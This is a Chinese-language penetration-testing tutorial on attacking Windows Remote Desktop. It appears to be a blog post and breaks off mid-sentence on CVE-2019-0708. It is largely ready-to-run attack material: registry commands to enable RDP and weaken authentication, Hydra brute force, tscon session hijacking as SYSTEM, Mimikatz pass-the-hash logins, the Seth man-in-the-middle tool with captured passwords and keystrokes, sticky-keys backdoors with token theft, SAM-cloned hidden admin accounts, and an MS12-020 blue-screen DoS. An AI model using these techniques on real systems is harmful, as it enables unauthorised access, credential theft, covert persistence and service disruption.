![20210523215514.png](https://image.3001.net/images/20210603/1622727752_60b8dc482db8b175255cd.png!small)

## 前言

远程桌面对了解内网渗透的人来说可能再熟悉不过了。在渗透测试中，拿下一台主机后有时候会选择开 3389
进远程桌面查看一下对方主机内有无一些有价值的东西可以利用。但是远程桌面的利用不仅如此，本节我们便来初步汇总一下远程桌面在内网渗透中的各种利用姿势。

文中若有不当之处还请各位大佬多多点评

我的博客：<https://whoamianony.top/>

## RDP 协议

RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议T.120
的一个扩展。远程桌面协议让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的
Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389
端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。

## RDP 服务的确定和启动

### RDP 服务的确定

 **注册表查询**

通过以下命令查询注册表来查看 RDP 服务是否开启：

    
    
    REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections    # 查看RDP服务是否开启: 1关闭, 0开启   
    ​  
    REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ WinStations\RDP-Tcp" /v PortNumber    # 查看 RDP 服务的端口

![image-20210523141451616](https://image.3001.net/images/20210603/1622727752_60b8dc489ef1a220aae9e.png!small)

 **进程查看**

通过以下命令来查看是否有 RDP 服务的进程：

    
    
    tasklist /svc | find "TermService"    # 找到对应服务进程的 PID   
    netstat -ano | find "3389"    # 找到进程对应的端口号

![image-20210523141531304](https://image.3001.net/images/20210603/1622727752_60b8dc48e7f20fb50f79f.png!small)

 **端口扫描**

攻击者可以借助 Nmap 扫描来验证端口 3389 是否被打开：

    
    
    nmap -sV -sC -p 3389 192.168.93.30

![image-20210523150123455](https://image.3001.net/images/20210603/1622727753_60b8dc493c2701e874d70.png!small)

### RDP 服务的启动

如果发现 3389 并没有开启，我们使用以下方式开启它。

 **修改注册表启动**

先通过修改注册表来设置一下允许远程桌面连接：

    
    
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

然后可以再配置一下防火墙，设置为允许远程桌面连接，命令：

    
    
    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

 **通过 Metasploit 模块启动**

拿到目标主机的 meterpreter 后，如果我们想登陆目标主机的远程桌面，我们可以使用 post/windows/manage/enable_rdp
模块对目标主机快速完成上述配置：

    
    
    use post/windows/manage/enable_rdp  
    set session 1  
    exploit

![image-20210523142640907](https://image.3001.net/images/20210603/1622727754_60b8dc4a987cb2b993870.png!small)

### RDP 服务的连接

开启目标主机的远程桌面后，我们便可以对目标主机进行连接了：

 **Linux 系统上的可以使用 rdesktop：**

    
    
    redesktop 192.168.93.30  
    # redesktop IP

 **Windows系统上可以使用 mstsc.exe**

特别要注意一下，有时候，仅开启了远程桌面还不行，在连接时可能出现以下报错：

![image-20210523143945139](https://image.3001.net/images/20210603/1622727756_60b8dc4c6fab090e0a116.png!small)

![image-20210523144518681](https://image.3001.net/images/20210603/1622727757_60b8dc4d54e142137201d.png!small)

这就需要关闭鉴权模式，我们采用如下命令，这里0代表关闭，1代表开启：

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0

即取消 “仅允许运行使用网络界别身份验证的远程桌面的计算机连接” 这一安全设置。

![image-20210523145146476](https://image.3001.net/images/20210603/1622727759_60b8dc4fab30fdbb3fecf.png!small)

此时就可以正常连接了：

![image-20210523145243938](https://image.3001.net/images/20210603/1622727760_60b8dc501958f8785eeae.png!small)

![image-20210523145404511](https://image.3001.net/images/20210603/1622727765_60b8dc5506ad32864a7e1.png!small)

## 对 RDP 口令进行暴力破解

在实战中，攻击者可以借助 Nmap 来扫描目标主机 3389 端口是否开启，如果目标主机开启了 3389
端口，那我们便可以对目标主机的远程桌面登录口令进行暴力猜解。

下面我们通过 Hydra 工具来展示对 RDP 进行爆破：

    
    
    Hydra -v -f -l whoamianony\administrator -P /root/wordlists.txt rdp://192.168.93.30

![image-20210523151208631](https://image.3001.net/images/20210603/1622727765_60b8dc55d81e8d2d5d148.png!small)

如上图所示，成功获取到目标主机 administrator 的登录口令，使用此凭据攻击者可以登录远程桌面服务：

![image-20210523151809181](https://image.3001.net/images/20210603/1622727768_60b8dc58490b72f519356.png!small)

## RDP 劫持实现未授权登录

对于开启远程桌面服务的 Windows 系统，当有多个用户登录该系统时，会产生多个会话，如下图：

![image-20210523173030619](https://image.3001.net/images/20210603/1622727773_60b8dc5de21babb7c2f73.png!small)

其中，管理员用户 Administrator 为本地登录，用户 bunny 为通过远程桌面服务（RDP）连接 3389 端口的远程桌面登录。接下来，如果用户
Administrator 想要切换至用户 bunny 的远程桌面，可通过右键—> 连接（Connect）进行连接，接着输入密码即可切换到 bunny
用户：

![image-20210523173120796](https://image.3001.net/images/20210603/1622727775_60b8dc5f4e847a5b76894.png!small)

![image-20210523173145771](https://image.3001.net/images/20210603/1622727775_60b8dc5fa52db838cffdc.png!small)

点击确定后，如下图所示，成功切换到了 bunny 用户的远程桌面：

![image-20210523172737212](https://image.3001.net/images/20210603/1622727776_60b8dc60176fa909caf3c.png!small)

而且，在 Windows 中有一个 tscon 命令，是命令行下使用的工具，也可以实现与上述相同的功能。

首先执行如下命令获取用户对应的会话 ID：

    
    
    query user

![image-20210523173320885](https://image.3001.net/images/20210603/1622727776_60b8dc606b472aa7a7a57.png!small)

可以看到用户 bunny 对应的会话 ID 为 2，然后通过执行 tscon 命令即可成功切换至用户 bunny 的远程桌面，命令如下：

    
    
    tscon 2 /PASSWORD:Bunny2021

/PASSWORD：bunny 用户的密码

![image-20210523172737212](https://image.3001.net/images/20210603/1622727776_60b8dc60ac65a6e9098e3.png!small)

可见，tscon
命令提供了一个切换用户会话的功能，并且，在正常情况下，切换会话时需要提供目标用户的登录密码。但这并不能完全确保会话安全，攻击者通过特殊的利用方法完全能够绕过验证，不输入密码即可切换到目标会话，从而实现目标用户的未授权登录。

而这里所讲的特殊的利用方法便是在 SYSTEM 权限下直接执行 tscon 会话切换命令：

    
    
    tscon ID

此时攻击者可以在不提供其他用户登录凭据的情况下自由切换会话桌面，实现劫持其他用户的 RDP 会话。

RDP 会话劫持在特定情况下可以大显身手，比如对于较新的 Windows 系统，默认情况下是无法通过 Mimikatz
导出用户明文口令的，此时我们通过常规方法无法切换至另一用户的桌面，那么我们便可以借助上文提到的方法，先提权至 SYSTEM 权限，再劫持目标用户的 RDP
并切换过去。

特别注意的是，即使远程连接的用户关闭了远程连接窗口，也不会劫持该回话，只是在后台显示 “已断开连接”（Disconnected）：

![image-20210523181120642](https://image.3001.net/images/20210603/1622727776_60b8dc60e9f48c6b9963a.png!small)

此时，仍能在 SYSTEM 权限下通过`tscon`实现未授权连接。

### 高权限用户劫持低权限用户的 RDP

高权限用户劫持低权限用户的 RDP 会话利用起来比较简单，由于具有管理员权限，可以直接通过创建服务等方式获取 SYSTEM 权限。

创建劫持用户会话的服务：

    
    
    sc create rdp binpath= "cmd.exe /k tscon 2 /dest:console"  
    sc start rdp

![image-20210523174510831](https://image.3001.net/images/20210603/1622727777_60b8dc614ee2577e4eac1.png!small)

执行`sc start rdp`后，我们创建的劫持会话的服务将会启动，由于 Windows 是以 SYSTEM 权限运行服务的，所以我们`tscon
2`命令也会以 SYSTEM 权限运行，此时便可以在不提供目标用户密码的情况下成功劫持目标用户的会话：

![image-20210523174727394](https://image.3001.net/images/20210603/1622727777_60b8dc61ac20e02d06378.png!small)

其实也可以使用 Psexec 来获得一个 SYSTEM 权限的 cmd（Psexec 获得的 shell 是 SYSTEM 权限的），然后再这个
SYSTEM 权限的 cmd 中直接执行`tscon 2`劫持命令：

    
    
    psexec -s -i cmd    # 获得一个 SYSTEM 权限的 cmd  
    ​  
    quser user    # 在新获得的 SYSTEM 权限的 cmd 中执行劫持命令  
    tscon 2 /dest:console

### 低权限用户劫持高权限用户的 RDP

低权限用户劫持高权限用户的 RDP 会话利用起来没有前者那么简单，因为权限太低，所以无法执行创建服务，执行 Psexec
等高权限的命令。所以如果低权限用户想要劫持高权限用户的 RDP 的话需要想办法提权，即将自己的权限提升至 SYSTEM。

实验环境如下：

![image-20210523180237610](https://image.3001.net/images/20210603/1622727778_60b8dc6200994fb2f5388.png!small)

假设有这么一种情况，有一台 Windows Server 2012 系统的服务器，其本地登录着一个普通域用户 bunny：

![image-20210523170231958](https://image.3001.net/images/20210603/1622727778_60b8dc625634aadb92dfb.png!small)

我们通过某种方式获得了这个 bunny 用户的登录密码，并使用这个 bunny 用户成功进行远程登录：

![image-20210523170429634](https://image.3001.net/images/20210603/1622727778_60b8dc62b1323d2a8f054.png!small)

此时，登录后查看任务管理器发现后台还存在管理员用户 Administrator 的会话：

![image-20210523171040725](https://image.3001.net/images/20210603/1622727784_60b8dc68c24056cf11e40.png!small)

并且使用`query user`命令查看其会话 ID 为 1。接下来我们尝试劫持这个管理员用户的远程会话。

首先使目标主机上线一个 bunny 用户权限的 MSF，然后通过各种系统漏洞获得了目标机的 System 权限：

![20210524122305.png](https://image.3001.net/images/20210603/1622727788_60b8dc6c7570da1555939.png!small)

然后进入 shell 中执行 tscon 命令进行劫持即可：

![image-20210523171756440](https://image.3001.net/images/20210603/1622727789_60b8dc6d019fd44ef66df.png!small)

如上图所示，成功劫持并切换到了 Administrator 用户的远程桌面。

## 利用哈希传递登录 RDP 远程桌面

Windows Server 2012 R2 采用了新版的 RDP 远程桌面协议，在这个新版协议中有一个 ”受限管理员” （Restricted
Admin）的特性。相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣，因为通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。

在抓取到的 Hash 无法破解的情况下，如果目标主机开启了 "Restricted Admin Mode" 也行，那么我们便可以使用 Hash 来直接实现
RDP 远程登录。 Restricted Admin Mode 在 Windows 8.1 和 Windows Server 2012 R2 上默认开启。

我们在渗透过程中可以通过修改注册表的方式开启目标主机的 Restricted Admin Mode，值为 0 代表开启，值为 1 代表关闭：

    
    
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f  
    ​  
    REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"    # 查看是否成功开启

![image-20210523182839368](https://image.3001.net/images/20210603/1622727796_60b8dc7456416348f13bb.png!small)

如上图所示，成功在目标主机开启了 Restricted Admin Mode。

然后再攻击机上使用 Mimikatz 进行哈希传递，大致原理就是哈希传递成功后执行`mstsc.exe /restrictedadmin`来打开：

    
    
    privilege::debug  
    sekurlsa::pth /user:administrator /domain:whoamianony.org /ntlm:ab89b1295e69d353dd7614c7a3a80cec "/run:mstsc.exe /restrictedadmin"

![image-20210523184624546](https://image.3001.net/images/20210603/1622727796_60b8dc74a6070b691b2ee.png!small)

报错了，说 CredSSP 加密数据库错误，大概是因为 Windows 10 家庭版的原因吧。然后俺有换了另一个版本的 Windows 成功了：

![image-20210523185719744](https://image.3001.net/images/20210603/1622727799_60b8dc77f3d3e7b96d4f3.png!small)

![image-20210523185853999](https://image.3001.net/images/20210603/1622727801_60b8dc79e2c004edc80a3.png!small)

注意，这里的受限管理员模式顾名思义只对管理员组有效。所以如果你获取到的用户属于远程桌面用户组，那么是无法通过 Hash 登录的。

## RDP 远程桌面中间人攻击

中间人攻击通常会导致凭据捕获。同样的，在对 RDP 会话进行中间人攻击，攻击者可以获得一个登录用户的明文密码，用于后期的横向移动。当 RDP
爆破走不通时，我们不妨尝试一下中间人。

Seth是一个用 Python 和 Bash 编写的 RDP 中间人攻击自动化工具，通过尝试降级连接用以提取明文凭证来实现 MitM RDP
连接，而不管网络级别的身份验证（NLA）是否启用。

项目地址：<https://github.com/SySS-Research/Seth>

使用该工具所要求的环境：

> Python 3
>
> Tcpdump
>
> Arpspoof
>
> Openssl

运行界面如下：

![image-20210523195123583](https://image.3001.net/images/20210603/1622727803_60b8dc7b9e1e5ed2b16cc.png!small)

使用方法如下：

    
    
    ./seth.sh <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP|HOST_IP> [<COMMAND>]

> INTERFACE：网卡
>
> ATTACKER IP：中间人 IP
>
> VICTIM IP：连接者 IP
>
> GATEWAY IP|HOST IP：被连接的远程主机 IP
>
> COMMAND：启动时执行的命令

执行以下命令启动 seth 监听：

    
    
    ./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30

![image-20210523200616438](https://image.3001.net/images/20210603/1622727804_60b8dc7cdd41b63a4b83f.png!small)

然后当 PC 上的用户远程登录 DC
时便会抓取到登录用户的明文密码。不仅如此，还可以对用户键盘的操作进行记录，甚至使用`<COMMAND>`在目标主机上执行命令。详情请看：<https://www.freebuf.com/sectool/178146.html>

攻击成功后类似如下：

    
    
    # ./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30
    ███████╗███████╗████████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
    ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
    ╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
    ███████║███████╗   ██║   ██║  ██║   https://www.syss.de
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
    [*] SpoofinG arp replies...
    [*] TurninG on IP forwardinG...
    [*] Set iptables rules for SYN packets...
    [*] WaitinG for a SYN packet to the oriGinal destination...
    [+] Got it! OriGinal destination is 192.168.93.30
    [*] Clone the x509 certificate of the oriGinal destination...
    [*] Adjust the iptables rule for all packets...
    [*] Run RDP proxy...
    ListeninG for new connection
    Connection received from 192.168.93.20:50431
    DownGradinG authentication options from 11 to 3
    Enable SSL
    alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000
    Tamper with NTLM response
    TLS alert access denied, DownGradinG CredSSP
    Connection lost
    Connection received from 192.168.57.103:50409
    ListeninG for new connection
    Enable SSL
    Connection lost
    Connection received from 192.168.57.103:50410
    ListeninG for new connection
    Enable SSL
    HidinG forGed protocol request from client
    .\alice:ilovebob
    Keyboard Layout: 0x409 (EnGlish_United_States)
    Key press:   LShift
    Key press:   S
    Key release:                 S
    Key release:                 LShift
    Key press:   E
    Key release:                 E
    Key press:   C
    Key release:                 C
    Key press:   R
    Key release:                 R
    Key press:   E
    Key release:                 E
    Key press:   T
    Key release:                 T
    Connection lost
    [*] CleaninG up...
    [*] Done.

## 获取 RDP 远程桌面连接记录

在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。接下来我们就介绍一下如何导出 RDP 连接的历史记录。

获取 RDP 远程桌面连接记录可以通过枚举注册表完成，但是如果想要获得所有用户的历史记录，需要逐个获得用户的 NTUSER.DAT
文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。

### 导出当前用户的历史记录

可以通过枚举下面的注册表键值查看当前用户的历史记录：

    
    
    HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers

如下图所示，每个注册表项保存连接的服务器地址，其中的键值`UsernameHint`对应登录用户名：

![image-20210524084553447](https://image.3001.net/images/20210603/1622727806_60b8dc7e338c728682fad.png!small)

看也可以通过 PowerShell 命令行来实现，首先通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名：

    
    
    dir "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" -Name

![image-20210524093321775](https://image.3001.net/images/20210603/1622727806_60b8dc7e83466e66647a5.png!small)

然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名：

    
    
    (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.93.30").UsernameHint

![image-20210524093431912](https://image.3001.net/images/20210603/1622727807_60b8dc7f54c5947ea41b9.png!small)

下面给出一个三好学生写的枚举脚本：

    
    
    $RegPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\"
    $QueryPath = dir $RegPath -Name
    foreach($Name in $QueryPath)
    {   
    	Try  
    	{  
    		$User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint
        		Write-Host "Server:"$Name
        		Write-Host "User:"$User"`n"
        	}
        	Catch  
        	{
    		Write-Host "No RDP Connections History"
        	}
    }

### 导出已登录用户的历史记录

已登录用户的注册表信息会同步保存在`HKEY_USERS\<SID>`目录下，`<SID>`要对应每个用户的 SID：

![image-20210524085841555](https://image.3001.net/images/20210603/1622727807_60b8dc7f95fa277f22ceb.png!small)

可以看到，当前系统登录三个用户，分别有三个子项。我们可以通过枚举注册表键值`HKEY_USERS\SID\Software\Microsoft\Terminal
Server Client\Servers`就能够获得已登录用户的远程桌面连接历史记录：

![image-20210524085946713](https://image.3001.net/images/20210603/1622727808_60b8dc800a4f277bdc8df.png!small)

>
> 也就是说，如果当前主机登录了两个用户，那么这两个用户的注册表信息都会保存在`HKEY_USERS\<SID>`下。但如果第三个用户未登录，此时是无法直接获得该用户的注册表信息的，会报如下错误：
>
>
> ![image-20210524090421662](https://image.3001.net/images/20210603/1622727808_60b8dc8076455d20fcd43.png!small)
>
> 也就无法直接导出该用户的远程桌面连接历史记录。

最后给出一个三好学生写的枚举脚本：

    
    
    $AllUser = Get-WmiObject -Class Win32_UserAccount  
    foreach($User in $AllUser)  
    {  
    $RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\"  
    Write-Host "User:"$User.Name  
    Write-Host "SID:"$User.SID  
    Write-Host "Status:"$User.Status  
    Try    
    {   
    $QueryPath = dir $RegPath -Name -ErrorAction Stop  
    }  
    Catch  
    {  
    Write-Host "No RDP Connections History"  
    Write-Host "----------------------------------"  
    continue  
    }  
    foreach($Name in $QueryPath)  
    {     
    Try    
    {    
    $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint  
    Write-Host "Server:"$Name  
    Write-Host "User:"$User  
    }  
    Catch    
    {  
    Write-Host "No RDP Connections History"  
    }  
    }  
    Write-Host "----------------------------------"   
    }

### 导出所有用户的历史记录

前面刚说了，对于未登录用户，无法直接获得注册表配置信息，那有什么解决办法？其实这里可以通过加载配置单元的方式来解决，即打开用户的 NTUSER.DAT
文件，加载配置单元导入用户配置信息，然后进行枚举。

选中 HKEY_USERS 项，“文件” —> “加载配置单元”，如下图：

![image-20210524091026247](https://image.3001.net/images/20210603/1622727808_60b8dc80ec469bc20b08a.png!small)

选择打开用户的 NTUSER.DAT 文件，路径为`C:\Documents and Settings\用户名\NTUSER.DAT`，这里以当前未登录的
moretz 用户为例：

![image-20210524092246927](https://image.3001.net/images/20210603/1622727809_60b8dc81589425c64114f.png!small)

接着指定一个项名称，即可在 HKEY_USERS 下读取该用户的注册表配置信息，如下图所示：

![image-20210524092404538](https://image.3001.net/images/20210603/1622727809_60b8dc81d5d691e477ff2.png!small)

然后按照之前的路径进行枚举即可。

此外，也可以通过命令行实现加载配置单元的实例：

    
    
    Reg load HKEY_USERS\testmoretz C:\Documents and Settings\moretz\NTUSER.DAT

最后给出一个三好学生写的枚举脚本：<https://github.com/3gstudent/List-RDP-Connections-History>

## 与远程桌面相关的权限维持方法

### Windows 粘滞键与辅助功能后门

估计你在我之前的文章中已经看到过 Shift 粘滞键后门的相关介绍。如果你在电脑上连按五次 shift
键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序：

![image-20210524103607344](https://image.3001.net/images/20210603/1622727810_60b8dc82380600a5dc0cb.png!small)

即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序：

![image-20210524103630570](https://image.3001.net/images/20210603/1622727810_60b8dc829407d8a24d413.png!small)

思考一下，如果我们知道了这个程序的绝对路径，那么我们就可以将 cmd.exe 伪装成这个粘滞键程序，当我们连按五次 shift 键时，便会弹出一个 CMD
命令行窗口，那么我们就可以无需登录进系统便可以控制目标主机了。

粘滞键程序名称为
“sethc.exe”，其路径为“c:\windows\system32\sethc.exe”。利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：

>
> 首先，我们手动或利用工具，找到sethc.exe将其删除或改名为sethc.exe.bak，接着将cmd.exe程序复制一个副本，并命名为“sethc.exe”。
>
> 最后，重启计算机再次按下5次Shift键时，就会弹出CMD界面，后门制作成功。

制作的方法如下，在目标主机上执行如下命令即可：

    
    
    cd c:\windows\system32    
    move sethc.exe sethc.exe.bak   // 将sethc.exe重命名  
    copy cmd.exe sethc.exe       // 将一个cmd.exe副本保存伪装成sethc.exe

![image-20210524105633178](https://image.3001.net/images/20210603/1622727812_60b8dc843c386f9098b18.png!small)

此时，我们打开目标主机的远程桌面，连续按下五次shift键，便可以看到目标主机屏幕上成功弹出了一个 CMD 窗口：

![image-20210524105829003](https://image.3001.net/images/20210603/1622727813_60b8dc852eb359709f683.png!small)

如上图，该 cmd 是以 SYSTEM
权限运行的，接下来我们就可以无需知道登录密码，无需登录，直接绕过登录页面对目标主机执行各种高权限的操作了，也完全可以新建一个高权限用户直接登录进入系统，是不是很有意思？

但是，先别高兴地太早了，在一些做了防护的主机上，即使是SYSTEM权限也是无法修改
sethc.exe的，只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：

当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NT
SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。

首先进入shell启动TrustedInstaller服务：

    
    
    sc.exe start TrustedInstaller       # 先进入shell启动TrustedInstaller服务

![image-20210524105428702](https://image.3001.net/images/20210603/1622727817_60b8dc89aa00f843c3918.png!small)

然后执行如下即可：

    
    
    use incognito  
    ps      # 找到TrustedInstaller的进程PID，这里为3476  
    steal_token <PID>      # 从该进程中窃取令牌  
    getuid   

![image-20210524105534598](https://image.3001.net/images/20210603/1622727819_60b8dc8b6290a2f8be615.png!small)

此时便可以对 sethc.exe 进行任何操作了。

由于此时获得的 CMD 是 SYSTEM 权限的，所以我们这里可以直接配合 RDP
劫持进去目标系统。如下图所示，发现目标主机上有三个用户的会话，那我们便可以通过`tscon`进行随意的劫持与切换：

![image-20210524110134327](https://image.3001.net/images/20210603/1622727823_60b8dc8f576168ca9446d.png!small)

执行`tscon 1`命令后，如下图所示，成功劫持并切换到了 administrator 用户的会话：

![image-20210524110255414](https://image.3001.net/images/20210603/1622727829_60b8dc951ea8e93f808d6.png!small)

除了这里的粘滞键 sethc 外，在 Windows 登录界面上还有很多辅助功能：

![image-20210524120229914](https://image.3001.net/images/20210603/1622727834_60b8dc9a7f9313a2293ec.png!small)

如上图所示，可以看到有屏幕键盘，放大镜，屏幕阅读等，这些额外的辅助功能选项可以帮助残疾人更容易地使用操作系统。这些辅助功能都可以像粘滞键 sethc
一样被攻击者用来制作一个后门。

Metasploit 中的`post/windows/manage/sticky_keys`模块可实现自动化地利用沾滞键的权限维持技术。该模块将用
cmd.exe 替换那些辅助功能的二进制文件（sethc、osk、disp、utilman）：

![image-20210524121055853](https://image.3001.net/images/20210603/1622727834_60b8dc9ad78585ce6a9ee.png!small)

使用方法如下：

    
    
    use post/windows/manage/sticky_keys  
    set session 6  
    set target UTILMAN  
    exploit

![image-20210524121733043](https://image.3001.net/images/20210603/1622727836_60b8dc9cd97a044289be5.png!small)

如上图所示，执行成功。

此时，我们开启目标主机的远程桌面，当我们点击左下角的辅助功能按钮后，成功弹出了 CMD 窗口，并且为 SYSTEM 权限的：

![image-20210524121931421](https://image.3001.net/images/20210603/1622727837_60b8dc9de878cee68d6af.png!small)

不仅是 CMD，我们还可以换成任意的 Payload 用于钓鱼，当受害者使用响应功能时便会触发 Payload 实施攻击。

### Windows 系统隐藏账户

该方法是通过建立隐藏账户，制作一个可以对目标主机进行远程桌面等的的系统用户，维持对目标 Windows 系统权限。制作方法跟步骤如下：

（1）在目标主机 cmd 中输入以下命令，创建一个与这鞥长域用户 whoami 类似反名为 whoami$ 的隐藏账户，并把该隐藏账户设置为管理员权限：

    
    
    net user whoami$ Liu78963 /add  
    net localgroup administrators whoami$ /add

![image-20210524095942624](https://image.3001.net/images/20210603/1622727843_60b8dca30308dcd890cb2.png!small)

如上图，我们已经创建成功，执行 net user 命令，发现是看不到 whoami$ 用户的：

![image-20210524100008092](https://image.3001.net/images/20210603/1622727843_60b8dca34519b66039d64.png!small)

然后，为了能使刚创建的 whoami$ 用户有权限登录目标机的远程桌面，我们还需要在计算机远程中添加 admin$ 用户：

![image-20210524102740437](https://image.3001.net/images/20210603/1622727843_60b8dca38a97a33b7b935.png!small)

此时便可以直接使用该隐藏用户登录 3389 远程桌面进行操作了：

![image-20210524102506268](https://image.3001.net/images/20210603/1622727845_60b8dca58059b22a47523.png!small)

但是此时隐蔽性仍不足，因为在控制面板和计算机管理的本地用户和组中，仍然是可以看的到该用户的：

![image-20210524100100027](https://image.3001.net/images/20210603/1622727849_60b8dca9ef130f6e8a81c.png!small)

为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。

打开注册表编辑器，找到`HKEY_LOCAL_MACHINE\SAM\SAM`，单机右建，选择 “权限”，把 Administrator
用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。

![image-20210524100332202](https://image.3001.net/images/20210603/1622727850_60b8dcaa5783051ba32d6.png!small)

这样 SAM 下的文件就都能看见了。

然后，在注册表编辑器的`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`处，点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录
“000001F4”：

![image-20210524100555491](https://image.3001.net/images/20210603/1622727851_60b8dcab1bc58eea98bae.png!small)

复制`000001F4`目录中的 F 键的值：

![image-20210524100907195](https://image.3001.net/images/20210603/1622727852_60b8dcac05756a94bc261.png!small)

然后找到与隐藏账户 whoami$ 右边类型的键值 “0x3ea” 相同的目录名，也就是 “000003EA”：

![image-20210524100745221](https://image.3001.net/images/20210603/1622727852_60b8dcac93c85678a6ffb.png!small)

然后将`000001F4`的F值粘贴到`000003EA`的F值中，点击确定：

![image-20210524101040695](https://image.3001.net/images/20210603/1622727853_60b8dcad75d0e9756404d.png!small)

然后从注册表中右键导出子项`000003EA`和 whoami$ ，并使用`net user whoami$ /del`删除 whoami$ 用户：

![image-20210524101310332](https://image.3001.net/images/20210603/1622727854_60b8dcae64f3d6240c1cb.png!small)

此时，查看注册表以及本地用户和组或者控制面板，whoami$ 用户就已经没有了。

最后，再将刚才导出的两个后缀为 .reg 的注册表项导入注册表中：

![image-20210524101528862](https://image.3001.net/images/20210603/1622727854_60b8dcaeda691ee88eaf8.png!small)

这样我们的隐藏账户 whoami$ 就创建好了。现在，不管你是在命令提示符下输入 net user 或者在系统用户管理界面都是看不到 whoami$
这个账户的，只有在注册表中才能看得到。

## 与远程桌面相关的漏洞

### 对 3389 端口的 DOS 攻击

这一利用借助的是 2012 年爆出来的 MS12-020 远程桌面协议 RDP 远程代码执行漏洞（CVE-2012-0002）。该漏洞是由于 Windows
在处理某些对象时存在错误，可通过特制的 RDP 报文访问未初始化或已经删除的对象，导致任意代码执行，然后控制系统。下面我们使用 Windows 7
系统进行复现。

在 Metasploit 中有两个该漏洞的利用模块：

![image-20210523152446266](https://image.3001.net/images/20210603/1622727855_60b8dcafa3d0b78c5e49f.png!small)

首先为了确定目标主机是否容易受到该漏洞的影响，可以先使用第二个命令来进行检测：

    
    
    use auxiliary/scanner/rdp/ms12_020_check  
    set rhosts 192.168.93.20  
    set rport 3389  
    exploit

![image-20210523152733140](https://image.3001.net/images/20210603/1622727856_60b8dcb0988041dc51a03.png!small)

目标机存在漏洞，然后尝试使用第一个模块进行攻击，这将对目标系统发起 DOS 攻击，最终导致目标系统蓝屏：

    
    
    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  
    set rhosts 192.168.93.20  
    set rport 3389  
    exploit

![image-20210523153115423](https://image.3001.net/images/20210603/1622727857_60b8dcb19a6a20b6c2ac8.png!small)

如下图所示，“死亡蓝屏” 出现啦：

![image-20210523153138405](https://image.3001.net/images/20210603/1622727858_60b8dcb2c2a33b87f957c.png!small)

从上图中可以看到目标系统是由于某些问题导致系统正在关闭。DoS 攻击执行者通常攻击托管在诸如银行或信用卡支付网关等高端 Web
服务器上的站点或服务，通过暂时或无限期地中断连接 Internet 的主机服务，使其目标用户无法使用机器或网络资源。

### CVE-2019-0708

2019 年 5 月 14 日微软官方发布安全补丁，修复了 Windows
远程桌面服务的远程代码执行漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。

此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与
